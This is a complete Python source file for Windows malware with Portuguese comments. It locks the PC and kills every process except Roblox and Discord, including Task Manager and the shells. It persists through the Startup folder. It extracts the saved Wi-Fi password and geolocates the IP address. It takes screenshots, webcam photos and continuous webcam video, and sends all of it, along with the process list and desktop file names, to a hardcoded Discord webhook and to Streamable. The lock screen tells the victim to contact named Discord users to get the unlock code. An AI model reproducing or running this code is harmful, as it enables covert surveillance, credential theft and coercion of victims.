import os
import shutil
import socket
import requests
import pyautogui
import cv2
import time
import tempfile
import subprocess
import ctypes
import win32gui
import win32con
from datetime import datetime
from threading import Thread
import pytz
import tkinter as tk
from tkinter import messagebox
import keyboard
import glob

# --- CONFIGURA√á√ïES ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1394031732721979422/doqnuLAykcwssJWYCTJ5hdR-zLIiPj716YuOGAwvqQ_XRAYP3dwtg6QsLogDzi5sSL8A"
CODIGO_SECRETO = "jolgue"
INTERVALO_MINUTOS = 5
APPS_PERMITIDOS = ["RobloxPlayerBeta.exe", "Discord.exe"]
TEXTO_AVISO = (
    "‚ö†Ô∏è Est√° tudo bloqueado tirando o Roblox e o Discord.\n"
    "Fala com o ‚Äúgoncal_fruits._69394‚Äù ou com o ‚Äújolgue_011‚Äù no Discord para desbloquear o teu PC."
)
FLAG_DESBLOQUEIO = "C:\\ProgramData\\unlocked.flag"
NOME_EXE = "bloqueio.exe"  # Nome do teu EXE compilado
PASTA_VIDEOS = os.path.join(tempfile.gettempdir(), "videos_gravados")
os.makedirs(PASTA_VIDEOS, exist_ok=True)
DURACAO_SEGMENTO = 5 * 60  # 5 minutos em segundos

# --- FUN√á√ïES AUXILIARES ---

def enviar_webhook(mensagem, ficheiro=None):
    try:
        data = {"content": mensagem}
        files = {}
        if ficheiro:
            files["file"] = (os.path.basename(ficheiro), open(ficheiro, 'rb'))
        requests.post(WEBHOOK_URL, data=data, files=files)
    except Exception as e:
        print("Erro ao enviar webhook:", e)

def obter_ip_localizacao():
    try:
        response = requests.get("http://ip-api.com/json/")
        info = response.json()
        return (
            f"IP: {info.get('query')}\n"
            f"Cidade: {info.get('city')}\n"
            f"Regi√£o: {info.get('regionName')}\n"
            f"Pa√≠s: {info.get('country')}\n"
            f"ISP: {info.get('isp')}\n"
        )
    except:
        return "N√£o foi poss√≠vel obter a localiza√ß√£o."

def obter_ssid():
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'SSID' in linha and 'BSSID' not in linha:
                return linha.split(':')[1].strip()
    except:
        return "N√£o foi poss√≠vel obter o SSID"

def obter_senha_wifi(ssid):
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'Key Content' in linha:
                return linha.split(':')[1].strip()
        return "Senha n√£o encontrada"
    except:
        return "N√£o foi poss√≠vel obter a senha"

def esconder_janela():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

def tirar_screenshot():
    caminho = os.path.join(tempfile.gettempdir(), "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(caminho)
    return caminho

def tirar_foto_webcam():
    caminho = os.path.join(tempfile.gettempdir(), "webcam.png")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(caminho, frame)
    cam.release()
    return caminho

def listar_processos():
    procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore")
    enviar_webhook(f"üìÉ Processos ativos ({hostname}):\n{procs[:1900]}")

def listar_desktop():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    arquivos = "\n".join(os.listdir(desktop_path))
    enviar_webhook(f"üñ•Ô∏è Ficheiros na √Årea de Trabalho ({hostname}):\n{arquivos[:1900]}")

def watchdog():
    esconder_janela()
    while not desbloqueado[0]:
        procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore").lower()
        for bloqueado in ["taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe"]:
            if bloqueado in procs:
                subprocess.call(f"taskkill /f /im {bloqueado}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

def definir_papel_preto():
    SPI_SETDESKWALLPAPER = 20
    preto_path = os.path.join(tempfile.gettempdir(), "preto.bmp")
    with open(preto_path, 'wb') as f:
        f.write(b'BM6\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00'
                b'\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x0B\x00\x00\x13\x0B\x00\x00\x00\x00\x00\x00\x00\x00'
                b'\x00\x00\x00\x00\x00\x00\x00')
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, preto_path, 3)

def bloquear_apps():
    while True:
        if desbloqueado[0]:
            break
        procs = subprocess.check_output('tasklist', shell=True).decode(errors="ignore").lower()
        for linha in procs.split("\n"):
            for proc in linha.split():
                if proc.endswith(".exe") and proc not in [a.lower() for a in APPS_PERMITIDOS] and NOME_EXE.lower() not in proc:
                    subprocess.call(f"taskkill /f /im {proc}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call("shutdown -a", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

def janela_mensagem():
    def continuar():
        root.destroy()
        janela_desbloqueio()

    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("600x300")
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    tk.Label(root, text=TEXTO_AVISO, font=("Arial", 14), justify="center", wraplength=500).pack(pady=40)
    tk.Button(root, text="OK", command=continuar, font=("Arial", 12)).pack(pady=20)
    root.mainloop()

def janela_desbloqueio():
    def tentar_desbloquear():
        if entrada.get() == CODIGO_SECRETO:
            desbloqueado[0] = True
            open(FLAG_DESBLOQUEIO, "w").write("desbloqueado")
            enviar_webhook(f"üîì C√≥digo correto inserido. PC desbloqueado ({hostname})")
            root.destroy()
        else:
            messagebox.showerror("Erro", "C√≥digo incorreto!")

    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("400x200")
    root.attributes('-topmost', True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    tk.Label(root, text="Insira o c√≥digo para desbloquear:", font=("Arial", 14)).pack(pady=20)
    entrada = tk.Entry(root, font=("Arial", 14), show="*")
    entrada.pack(pady=10)
    tk.Button(root, text="Desbloquear", command=tentar_desbloquear, font=("Arial", 12)).pack(pady=10)
    root.mainloop()

def atalho_secreto():
    keyboard.add_hotkey('ctrl+shift+g', desbloquear_forcado)

def desbloquear_forcado():
    if not desbloqueado[0]:
        desbloqueado[0] = True
        open(FLAG_DESBLOQUEIO, "w").write("desbloqueado")
        enviar_webhook(f"üö® PC desbloqueado com CTRL+SHIFT+G ({hostname})")

def adicionar_startup():
    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = os.path.join(os.getcwd(), NOME_EXE)
    if not os.path.exists(os.path.join(startup, NOME_EXE)):
        shutil.copy2(exe_path, startup)

# --- Grava√ß√£o cont√≠nua da webcam ---
class GravadorContinuo:
    def __init__(self):
        self.cap = cv2.VideoCapture(0)
        self.fps = int(self.cap.get(cv2.CAP_PROP_FPS)) or 20
        self.width = int(self.cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        self.height = int(self.cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        self.gravando = True

    def start(self):
        Thread(target=self.gravar_loop, daemon=True).start()

    def gravar_loop(self):
        while self.gravando:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            arquivo = os.path.join(PASTA_VIDEOS, f"gravacao_{timestamp}.avi")
            quatrocc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(arquivo, quatrocc, self.fps, (self.width, self.height))
            inicio = time.time()
            while (time.time() - inicio) < DURACAO_SEGMENTO and self.gravando:
                ret, frame = self.cap.read()
                if not ret:
                    break
                out.write(frame)
            out.release()
        self.cap.release()

    def stop(self):
        self.gravando = False

# --- Upload para Streamable e envio do link ---
def upload_streamable(video_path):
    try:
        with open(video_path, 'rb') as f:
            response = requests.post('https://api.streamable.com/upload', files={'file': f})
        if response.status_code == 200:
            shortcode = response.json().get('shortcode')
            if shortcode:
                return f"https://streamable.com/{shortcode}"
    except Exception as e:
        print("Erro upload streamable:", e)
    return None

def enviar_link_webhook(url_video):
    mensagem = f"üé• Novo v√≠deo gravado e enviado: {url_video} ({hostname})"
    enviar_webhook(mensagem)

def uploader_periodico():
    while True:
        time.sleep(30 * 60)  # 30 minutos
        arquivos = glob.glob(os.path.join(PASTA_VIDEOS, "*.avi"))
        if not arquivos:
            continue
        arquivo_mais_recente = max(arquivos, key=os.path.getmtime)
        link = upload_streamable(arquivo_mais_recente)
        if link:
            enviar_link_webhook(link)
            # Apaga o arquivo para liberar espa√ßo
            try:
                os.remove(arquivo_mais_recente)
            except:
                pass

# --- EXECU√á√ÉO INICIAL ---
hostname = socket.gethostname()
if not os.path.exists(FLAG_DESBLOQUEIO):
    adicionar_startup()
    definir_papel_preto()
    info_localizacao = obter_ip_localizacao()
    ssid = obter_ssid()
    senha_wifi = obter_senha_wifi(ssid)

    enviar_webhook(
        f"üì° Monitoriza√ß√£o iniciada no PC: {hostname}\n"
        f"{info_localizacao}"
        f"Wi-Fi: {ssid}\n"
        f"Senha Wi-Fi: {senha_wifi}\n"
    )

    desbloqueado = [False]

    gravador = GravadorContinuo()
    gravador.start()

    Thread(target=bloquear_apps, daemon=True).start()
    Thread(target=watchdog, daemon=True).start()
    Thread(target=janela_mensagem, daemon=True).start()
    Thread(target=atalho_secreto, daemon=True).start()
    Thread(target=uploader_periodico, daemon=True).start()

    while not desbloqueado[0]:
        try:
            hora_local = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            fuso_pt = pytz.timezone("Europe/Lisbon")
            hora_pt = datetime.now(fuso_pt).strftime("%Y-%m-%d %H:%M:%S")

            screenshot = tirar_screenshot()
            enviar_webhook(f"üñ•Ô∏è Screenshot ({hostname}) | Hora PC: {hora_local} | Hora PT: {hora_pt}", ficheiro=screenshot)
            os.remove(screenshot)

            webcam = tirar_foto_webcam()
            enviar_webhook(f"üì∑ Webcam ({hostname}) | Hora PC: {hora_local} | Hora PT: {hora_pt}", ficheiro=webcam)
            os.remove(webcam)

            # Envia lista de processos e desktop a cada 12 horas
            tempo_atual = time.time()
            if 'ultimo_envio_12h' not in globals():
                globals()['ultimo_envio_12h'] = tempo_atual
            elif tempo_atual - globals()['ultimo_envio_12h'] >= 12 * 3600:
                listar_processos()
                listar_desktop()
                globals()['ultimo_envio_12h'] = tempo_atual

        except Exception as e:
            enviar_webhook(f"‚ö†Ô∏è Erro ({hostname}): {e}")
        time.sleep(INTERVALO_MINUTOS * 60)

else:
    enviar_webhook(f"‚úÖ PC j√° desbloqueado ({hostname}).")
